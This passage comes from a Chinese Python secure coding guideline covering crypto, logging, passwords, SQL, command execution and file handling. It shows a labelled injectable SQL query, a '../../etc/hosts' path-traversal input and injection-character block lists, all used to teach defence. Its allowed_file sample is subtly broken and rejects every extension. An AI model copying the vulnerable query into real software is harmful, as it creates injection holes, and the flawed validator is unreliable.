【必须】设置正确的HTTP响应包类型</a></li><li><a href="#162-%E5%BF%85%E9%A1%BB%E8%AE%BE%E7%BD%AE%E5%AE%89%E5%85%A8%E7%9A%84http%E5%93%8D%E5%BA%94%E5%A4%B4">1.6.2 【必须】设置安全的HTTP响应头</a></li><li><a href="#163-%E5%BF%85%E9%A1%BB%E5%AF%B9%E5%A4%96%E8%BE%93%E5%87%BA%E9%A1%B5%E9%9D%A2%E5%8C%85%E5%90%AB%E7%AC%AC%E4%B8%89%E6%96%B9%E6%95%B0%E6%8D%AE%E6%97%B6%E9%A1%BB%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86">1.6.3 【必须】对外输出页面包含第三方数据时须进行编码处理</a></li></ul></li><li><a href="#17-%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA">1.7 数据输出</a><ul><li><a href="#171-%E5%BF%85%E9%A1%BB%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8">1.7.1 【必须】敏感数据加密存储</a></li><li><a href="#172-%E5%BF%85%E9%A1%BB%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%BF%85%E9%A1%BB%E7%94%B1%E5%90%8E%E5%8F%B0%E8%BF%9B%E8%A1%8C%E8%84%B1%E6%95%8F%E5%A4%84%E7%90%86">1.7.2 【必须】敏感信息必须由后台进行脱敏处理</a></li><li><a href="#173-%E5%BF%85%E9%A1%BB%E9%AB%98%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%A6%81%E6%AD%A2%E5%AD%98%E5%82%A8%E5%B1%95%E7%A4%BA">1.7.3 【必须】高敏感信息禁止存储、展示</a></li><li><a href="#174-%E5%BF%85%E9%A1%BB%E4%B8%AA%E4%BA%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%84%B1%E6%95%8F%E5%B1%95%E7%A4%BA">1.7.4 【必须】个人敏感信息脱敏展示</a></li><li><a href="#175-%E5%BF%85%E9%A1%BB%E9%9A%90%E8%97%8F%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80">1.7.5 【必须】隐藏后台地址</a></li></ul></li><li><a href="#18-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">1.8 权限管理</a><ul><li><a href="#181-%E5%BF%85%E9%A1%BB%E9%BB%98%E8%AE%A4%E9%89%B4%E6%9D%83">1.8.1 【必须】默认鉴权</a></li><li><a href="#182-%E5%BF%85%E9%A1%BB%E6%8E%88%E6%9D%83%E9%81%B5%E5%BE%AA%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99">1.8.2 【必须】授权遵循最小权限原则</a></li><li><a href="#183-%E5%BF%85%E9%A1%BB%E9%81%BF%E5%85%8D%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE">1.8.3 【必须】避免越权访问</a></li><li><a href="#184-%E5%BB%BA%E8%AE%AE%E5%8F%8A%E6%97%B6%E6%B8%85%E7%90%86%E4%B8%8D%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90">1.8.4 【建议】及时清理不需要的权限</a></li></ul></li><li><a href="#19-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">1.9 异常处理</a><ul><li><a href="#191-%E5%BF%85%E9%A1%BB%E4%B8%8D%E5%90%91%E5%AF%B9%E5%A4%96%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA">1.9.1 【必须】不向对外错误提示</a></li><li><a href="#192-%E5%BF%85%E9%A1%BB%E7%A6%81%E6%AD%A2%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF">1.9.2 【必须】禁止异常抛出敏感信息</a></li></ul></li><li><a href="#110-flask%E5%AE%89%E5%85%A8">1.10 Flask安全</a><ul><li><a href="#1101-%E5%BF%85%E9%A1%BB%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E5%85%B3%E9%97%AD%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F">1.10.1 【必须】生产环境关闭调试模式</a></li><li><a href="#1102-%E5%BB%BA%E8%AE%AE%E9%81%B5%E5%BE%AAflask%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83">1.10.2 【建议】遵循Flask安全规范</a></li></ul></li><li><a href="#111-django%E5%AE%89%E5%85%A8">1.11 Django安全</a><ul><li><a href="#1111-%E5%BF%85%E9%A1%BB%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E5%85%B3%E9%97%AD%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F">1.11.1 【必须】生产环境关闭调试模式</a></li><li><a href="#1112-%E5%BB%BA%E8%AE%AE%E4%BF%9D%E6%8C%81django%E8%87%AA%E5%B8%A6%E7%9A%84%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%E5%BC%80%E5%90%AF">1.11.2 【建议】保持Django自带的安全特性开启</a></li></ul></li></ul></li></ul></li></ul><h1 id="通用类"><a href="#通用类" class="headerlink" title="通用类"></a>通用类</h1><h2 id="I-代码实现"><a href="#I-代码实现" class="headerlink" title="I. 代码实现"></a>I. 代码实现</h2><h3 id="1-1-加密算法"><a href="#1-1-加密算法" class="headerlink" title="1.1 加密算法"></a>1.1 加密算法</h3><h4 id="1-1-1-【必须】避免使用不安全的对称加密算法"><a href="#1-1-1-【必须】避免使用不安全的对称加密算法" class="headerlink" title="1.1.1 【必须】避免使用不安全的对称加密算法"></a>1.1.1 【必须】避免使用不安全的对称加密算法</h4><ul><li>DES和3DES已经不再适用于现代应用程序，应改为使用AES。</li></ul><h3 id="1-2-程序日志"><a href="#1-2-程序日志" class="headerlink" title="1.2 程序日志"></a>1.2 程序日志</h3><h4 id="1-2-1-【建议】对每个重要行为都记录日志"><a href="#1-2-1-【建议】对每个重要行为都记录日志" class="headerlink" title="1.2.1 【建议】对每个重要行为都记录日志"></a>1.2.1 【建议】对每个重要行为都记录日志</h4><ul><li>确保重要行为都记录日志，且可靠保存6个月以上。</li></ul><h4 id="1-2-2-【建议】禁止将未经验证的用户输入直接记录日志"><a href="#1-2-2-【建议】禁止将未经验证的用户输入直接记录日志" class="headerlink" title="1.2.2 【建议】禁止将未经验证的用户输入直接记录日志"></a>1.2.2 【建议】禁止将未经验证的用户输入直接记录日志</h4><ul><li>当日志条目包含未经净化的用户输入时会引发记录注入漏洞。恶意用户会插入伪造的日志数据，从而让系统管理员以为是系统行为。</li></ul><h4 id="1-2-3-【建议】避免在日志中保存敏感信息"><a href="#1-2-3-【建议】避免在日志中保存敏感信息" class="headerlink" title="1.2.3 【建议】避免在日志中保存敏感信息"></a>1.2.3 【建议】避免在日志中保存敏感信息</h4><ul><li>不能在日志保存密码（包括明文密码和密文密码）、密钥和其它敏感信息</li></ul><h3 id="1-3-系统口令"><a href="#1-3-系统口令" class="headerlink" title="1.3 系统口令"></a>1.3 系统口令</h3><h4 id="1-3-1-【必须】禁止使用空口令、弱口令、已泄露口令"><a href="#1-3-1-【必须】禁止使用空口令、弱口令、已泄露口令" class="headerlink" title="1.3.1 【必须】禁止使用空口令、弱口令、已泄露口令"></a>1.3.1 【必须】禁止使用空口令、弱口令、已泄露口令</h4><h4 id="1-3-2-【必须】口令强度要求"><a href="#1-3-2-【必须】口令强度要求" class="headerlink" title="1.3.2 【必须】口令强度要求"></a>1.3.2 【必须】口令强度要求</h4><blockquote><p> 口令强度须同时满足：</p><ol><li>密码长度大于14位</li><li>必须包含下列元素：大小写英文字母、数字、特殊字符</li><li>不得使用各系统、程序的默认初始密码</li><li>不能与最近6次使用过的密码重复</li><li>不得与其他外部系统使用相同的密码</li></ol></blockquote><h4 id="1-3-3-【必须】口令存储安全"><a href="#1-3-3-【必须】口令存储安全" class="headerlink" title="1.3.3 【必须】口令存储安全"></a>1.3.3 【必须】口令存储安全</h4><ul><li>禁止明文存储口令</li><li>禁止使用弱密码学算法（如DES和3DES）加密存储口令</li><li>使用不可逆算法和随机salt对口令进行加密存储</li></ul><h4 id="1-3-4-【必须】禁止传递明文口令"><a href="#1-3-4-【必须】禁止传递明文口令" class="headerlink" title="1.3.4 【必须】禁止传递明文口令"></a>1.3.4 【必须】禁止传递明文口令</h4><h4 id="1-3-5-【必须】禁止在不安全的信道中传输口令"><a href="#1-3-5-【必须】禁止在不安全的信道中传输口令" class="headerlink" title="1.3.5 【必须】禁止在不安全的信道中传输口令"></a>1.3.5 【必须】禁止在不安全的信道中传输口令</h4><h2 id="II-配置-amp-环境"><a href="#II-配置-amp-环境" class="headerlink" title="II. 配置&amp;环境"></a>II. 配置&amp;环境</h2><h3 id="2-1-Python版本选择"><a href="#2-1-Python版本选择" class="headerlink" title="2.1 Python版本选择"></a>2.1 Python版本选择</h3><h4 id="2-1-1-【建议】使用Python-3-6-的版本"><a href="#2-1-1-【建议】使用Python-3-6-的版本" class="headerlink" title="2.1.1 【建议】使用Python 3.6+的版本"></a>2.1.1 【建议】使用Python 3.6+的版本</h4><ul><li>新增的项目应使用 Python 3.6+</li></ul><blockquote><p><strong>为什么要这么做？</strong><br>由于 Python 2 在 <a href="https://www.python.org/doc/sunset-python-2/">2020 年停止维护</a>，相关组件的漏洞不能得到及时修复与维护</p></blockquote><h3 id="2-2-第三方包安全"><a href="#2-2-第三方包安全" class="headerlink" title="2.2 第三方包安全"></a>2.2 第三方包安全</h3><h4 id="2-2-2-【必须】禁止使用不安全的组件"><a href="#2-2-2-【必须】禁止使用不安全的组件" class="headerlink" title="2.2.2 【必须】禁止使用不安全的组件"></a>2.2.2 【必须】禁止使用不安全的组件</h4><h3 id="2-3-配置信息"><a href="#2-3-配置信息" class="headerlink" title="2.3 配置信息"></a>2.3 配置信息</h3><h4 id="2-3-1-【必须】密钥存储安全"><a href="#2-3-1-【必须】密钥存储安全" class="headerlink" title="2.3.1 【必须】密钥存储安全"></a>2.3.1 【必须】密钥存储安全</h4><ul><li>在使用对称密码算法时，需要保护好加密密钥。当算法涉及敏感、业务数据时，可通过非对称算法协商加密密钥。其他较为不敏感的数据加密，可以通过变换算法等方式保护密钥。</li></ul><h4 id="2-3-2-【必须】禁止硬编码敏感配置"><a href="#2-3-2-【必须】禁止硬编码敏感配置" class="headerlink" title="2.3.2 【必须】禁止硬编码敏感配置"></a>2.3.2 【必须】禁止硬编码敏感配置</h4><ul><li>禁止在源码中硬编码AK&#x2F;SK、IP、数据库账密等配置信息</li><li>应使用配置系统或KMS密钥管理系统。</li></ul><h1 id="后台类"><a href="#后台类" class="headerlink" title="后台类"></a>后台类</h1><h2 id="I-代码实现-1"><a href="#I-代码实现-1" class="headerlink" title="I. 代码实现"></a>I. 代码实现</h2><h3 id="1-1-输入验证"><a href="#1-1-输入验证" class="headerlink" title="1.1 输入验证"></a>1.1 输入验证</h3><h4 id="1-1-1-【必须】按类型进行数据校验"><a href="#1-1-1-【必须】按类型进行数据校验" class="headerlink" title="1.1.1 【必须】按类型进行数据校验"></a>1.1.1 【必须】按类型进行数据校验</h4><ul><li><p>所有程序外部输入的参数值，应进行数据校验。校验内容包括但不限于：数据长度、数据范围、数据类型与格式。校验不通过，应拒绝。</p></li><li><p>推荐使用组件：<a href="https://github.com/pyeve/cerberus">Cerberus</a>、<a href="https://github.com/Julian/jsonschema">jsonschema</a>、<a href="https://docs.djangoproject.com/en/dev/ref/validators/">Django-Validators</a></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Cerberus示例</span></span><br><span class="line">v = Validator(&#123;<span class="string">&#x27;name&#x27;</span>: &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;string&#x27;</span>&#125;&#125;)</span><br><span class="line">v.validate(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;john doe&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># jsonschema示例</span></span><br><span class="line">schema = &#123;</span><br><span class="line">     <span class="string">&quot;type&quot;</span> : <span class="string">&quot;object&quot;</span>,</span><br><span class="line">     <span class="string">&quot;properties&quot;</span> : &#123;</span><br><span class="line">         <span class="string">&quot;price&quot;</span> : &#123;<span class="string">&quot;type&quot;</span> : <span class="string">&quot;number&quot;</span>&#125;,</span><br><span class="line">         <span class="string">&quot;name&quot;</span> : &#123;<span class="string">&quot;type&quot;</span> : <span class="string">&quot;string&quot;</span>&#125;,</span><br><span class="line">     &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">validate(instance=&#123;<span class="string">&quot;name&quot;</span> : <span class="string">&quot;Eggs&quot;</span>, <span class="string">&quot;price&quot;</span> : <span class="number">34.99</span>&#125;, schema=schema)</span><br></pre></td></tr></table></figure><h3 id="1-2-SQL操作"><a href="#1-2-SQL操作" class="headerlink" title="1.2 SQL操作"></a>1.2 SQL操作</h3><h4 id="1-2-1-【必须】使用参数化查询"><a href="#1-2-1-【必须】使用参数化查询" class="headerlink" title="1.2.1 【必须】使用参数化查询"></a>1.2.1 【必须】使用参数化查询</h4><ul><li>使用参数化SQL语句，强制区分数据和命令，避免产生SQL注入漏洞。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误示例</span></span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"></span><br><span class="line">mydb = mysql.connector.connect(</span><br><span class="line"><span class="meta">... </span>...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cur = mydb.cursor()</span><br><span class="line">userid = get_id_from_user()</span><br><span class="line"><span class="comment"># 使用%直接格式化字符串拼接SQL语句</span></span><br><span class="line">cur.execute(<span class="string">&quot;SELECT `id`, `password` FROM `auth_user` WHERE `id`=%s &quot;</span> % (userid,)) </span><br><span class="line">myresult = cur.fetchall()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安全示例</span></span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"></span><br><span class="line">mydb = mysql.connector.connect(</span><br><span class="line"><span class="meta">... </span>...</span><br><span class="line">)</span><br><span class="line">cur = mydb.cursor()</span><br><span class="line">userid = get_id_from_user()</span><br><span class="line"><span class="comment"># 将元组以参数的形式传入</span></span><br><span class="line">cur.execute(<span class="string">&quot;SELECT `id`, `password` FROM `auth_user` WHERE `id`=%s &quot;</span> , (userid,))</span><br><span class="line">myresult = cur.fetchall()</span><br></pre></td></tr></table></figure><ul><li>推荐使用ORM框架来操作数据库，如：使用<code>SQLAlchemy</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装sqlalchemy并初始化数据库连接</span></span><br><span class="line"><span class="comment"># pip install sqlalchemy</span></span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"><span class="comment"># 初始化数据库连接，修改为你的数据库用户名和密码</span></span><br><span class="line">engine = create_engine(<span class="string">&#x27;mysql+mysqlconnector://user:password@host:port/DATABASE&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引用数据类型</span></span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> Column, String, Integer, Float</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"></span><br><span class="line">Base = declarative_base()</span><br><span class="line"><span class="comment"># 定义 Player 对象:</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span>(<span class="title class_ inherited__">Base</span>):</span><br><span class="line">    <span class="comment"># 表的名字:</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;player&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 表的结构:</span></span><br><span class="line">    player_id = Column(Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    team_id = Column(Integer)</span><br><span class="line">    player_name = Column(String(<span class="number">255</span>))</span><br><span class="line">    height = Column(Float(<span class="number">3</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增删改查</span></span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"><span class="comment"># 创建 DBSession 类型:</span></span><br><span class="line">DBSession = sessionmaker(bind=engine)</span><br><span class="line"><span class="comment"># 创建 session 对象:</span></span><br><span class="line">session = DBSession()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增:</span></span><br><span class="line">new_player = Player(team_id=<span class="number">101</span>, player_name=<span class="string">&quot;Tom&quot;</span>, height=<span class="number">1.98</span>)</span><br><span class="line">session.add(new_player)</span><br><span class="line"><span class="comment"># 删:</span></span><br><span class="line">row = session.query(Player).<span class="built_in">filter</span>(Player.player_name==<span class="string">&quot;Tom&quot;</span>).first()</span><br><span class="line">session.delete(row)</span><br><span class="line"><span class="comment"># 改:</span></span><br><span class="line">row = session.query(Player).<span class="built_in">filter</span>(Player.player_name==<span class="string">&quot;Tom&quot;</span>).first()</span><br><span class="line">row.height = <span class="number">1.99</span></span><br><span class="line"><span class="comment"># 查:</span></span><br><span class="line">rows = session.query(Player).<span class="built_in">filter</span>(Player.height &gt;= <span class="number">1.88</span>).<span class="built_in">all</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交即保存到数据库:</span></span><br><span class="line">session.commit()</span><br><span class="line"><span class="comment"># 关闭 session:</span></span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><h4 id="1-2-2-【必须】对参数进行过滤"><a href="#1-2-2-【必须】对参数进行过滤" class="headerlink" title="1.2.2 【必须】对参数进行过滤"></a>1.2.2 【必须】对参数进行过滤</h4><ul><li>将接受到的外部参数动态拼接到SQL语句时，必须对参数进行安全过滤。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sql_filter</span>(<span class="params">sql, max_length=<span class="number">20</span></span>):</span><br><span class="line">    dirty_stuff = [<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;+&quot;</span>, </span><br><span class="line">                   <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;,&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> stuff <span class="keyword">in</span> dirty_stuff:</span><br><span class="line">        sql = sql.replace(stuff, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sql[:max_length]</span><br></pre></td></tr></table></figure><h3 id="1-3-执行命令"><a href="#1-3-执行命令" class="headerlink" title="1.3 执行命令"></a>1.3 执行命令</h3><h4 id="1-3-1-【建议】避免直接调用函数执行系统命令"><a href="#1-3-1-【建议】避免直接调用函数执行系统命令" class="headerlink" title="1.3.1 【建议】避免直接调用函数执行系统命令"></a>1.3.1 【建议】避免直接调用函数执行系统命令</h4><ul><li>相关功能的实现应避免直接调用系统命令（如<code>os.system()</code>、<code>os.popen()</code>、<code>subprocess.call()</code>等），优先使用其他同类操作进行代替，比如：通过文件系统API进行文件操作而非直接调用操作系统命令</li><li>如评估无法避免，执行命令应避免拼接外部数据，同时进行执行命令的白名单限制。</li></ul><h4 id="1-3-2-【必须】过滤传入命令执行函数的字符"><a href="#1-3-2-【必须】过滤传入命令执行函数的字符" class="headerlink" title="1.3.2 【必须】过滤传入命令执行函数的字符"></a>1.3.2 【必须】过滤传入命令执行函数的字符</h4><ul><li>程序调用各类函数执行系统命令时，如果涉及的命令由外部传入，过滤传入命令执行函数的字符。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 替换可以用来注入命令的字符为空</span></span><br><span class="line">badchars = <span class="string">&quot;\n&amp;;|&#x27;\&quot;$()`-&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> badchars:</span><br><span class="line">    domain = domain.replace(char, <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">result = os.system(<span class="string">&quot;nslookup &quot;</span> + shlex.quote(domain))</span><br></pre></td></tr></table></figure><h4 id="1-3-3-【必须】禁止不安全的代码执行"><a href="#1-3-3-【必须】禁止不安全的代码执行" class="headerlink" title="1.3.3 【必须】禁止不安全的代码执行"></a>1.3.3 【必须】禁止不安全的代码执行</h4><ul><li>禁止使用 <code>eval</code> 函数处理存在外部输入的数据。</li></ul><h3 id="1-4-文件操作"><a href="#1-4-文件操作" class="headerlink" title="1.4 文件操作"></a>1.4 文件操作</h3><h4 id="1-4-1-【必须】文件类型限制"><a href="#1-4-1-【必须】文件类型限制" class="headerlink" title="1.4.1 【必须】文件类型限制"></a>1.4.1 【必须】文件类型限制</h4><ul><li>通过白名单对上传或者下载的文件类型、大小进行严格校验。仅允许业务所需文件类型上传，避免上传木马、WebShell等文件。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">  </span><br><span class="line">ALLOWED_EXTENSIONS = [<span class="string">&#x27;txt&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>]</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> </span><br><span class="line">        <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename <span class="keyword">and</span> </span><br><span class="line">        os.path.splitext(filename)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> filename</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h4 id="1-4-2-【必须】禁止外部文件存储于可执行目录"><a href="#1-4-2-【必须】禁止外部文件存储于可执行目录" class="headerlink" title="1.4.2 【必须】禁止外部文件存储于可执行目录"></a>1.4.2 【必须】禁止外部文件存储于可执行目录</h4><ul><li>禁止外部文件存储于WEB容器的可执行目录（appBase）。建议使用 <a href="https://docs.python.org/3/library/tempfile.html">tempfile</a> 库处理临时文件和临时目录。</li></ul><h4 id="1-4-3-【必须】避免路径穿越"><a href="#1-4-3-【必须】避免路径穿越" class="headerlink" title="1.4.3 【必须】避免路径穿越"></a>1.4.3 【必须】避免路径穿越</h4><ul><li>保存在本地文件系统时，必须对路径进行合法校验，避免目录穿越漏洞</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">upload_dir = <span class="string">&#x27;/tmp/upload/&#x27;</span> <span class="comment"># 预期的上传目录</span></span><br><span class="line">file_name = <span class="string">&#x27;../../etc/hosts&#x27;</span> <span class="comment"># 用户传入的文件名</span></span><br><span class="line">absolute_path = os.path.join(upload_dir, file_name) <span class="comment"># /tmp/upload/../../etc/hosts</span></span><br><span class="line">normalized_path = os.path.normpath(absolute_path) <span class="comment"># /etc/hosts</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> normalized_path.startswith(upload_dir): <span class="comment"># 检查最终路径是否在预期的上传目录中</span></span><br><span class="line">    <span class="keyword">raise</span> IOError()</span><br></pre></td></tr></table></figure><h4 id="1-4-4-【必须】禁用XML外部实体的方法"><a href="#1-4-4-【必须】禁用XML外部实体的方法" class="headerlink" title="1.4.4 【必须】禁用XML外部实体的方法"></a>1.4.4 【必须】禁用XML外部实体的方法</h4><ul><li><p>禁用XML外部实体的方法，来预防XXE攻击。</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">  </span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></li></ul><h4 id="1-4-5-【必须】禁用不安全的反序列化函数"><a href="#1-4-5-【必须】禁用不安全的反序列化函数" class="headerlink" title="1.4.5 【必须】禁用不安全的反序列化函数"></a>1.4.5 【必须】禁用不安全的反序列化函数</h4><ul><li>禁用<code>yaml.unsafe_load()</code>函数反序列化YAML数据，来避免反序列化漏洞执行漏洞。</li></ul><h4 id="1-4-6-【建议】避免路径拼接"><a href="#1-4-6-【建议】避免路径拼接" class="headerlink" title="1.4.6 【建议】避免路径拼接"></a>1.4.6 【建议】避免路径拼接</h4><ul><li>文件目录避免外部参数拼接。保存文件目录建议后台写死并对文件名进行校验（字符类型、长度）。</li></ul><h4 id="1-4-7-【建议】文件名hash化处理"><a href="#1-4-7-【建议】文件名hash化处理" class="headerlink" title="1.4.7 【建议】文件名hash化处理"></a>1.4.7 【建议】文件名hash化处理</h4><ul><li>建议文件保存时，将文件名替换为随机字符串。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    ext = os.path.splitext(filename)[<span class="number">1</span>]</span><br><span class="line">    new_filename = uuid.uuid4().<span class="built_in">hex</span> + ext</span><br><span class="line">    <span class="keyword">return</span> new_filename</span><br></pre></td></tr></table></figure><h3 id="1-5-网络请求"><a href="#1-5-网络请求" class="headerlink" title="1.5 网络请求"></a>1.5 网络请求</h3><h4 id="1-5-1-【必须】限定访问网络资源地址范围"><a href="#1-5-1-【必须】限定访问网络资源地址范围" class="headerlink" title="1.5.1 【必须】限定访问网络资源地址范围"></a>1.5.1 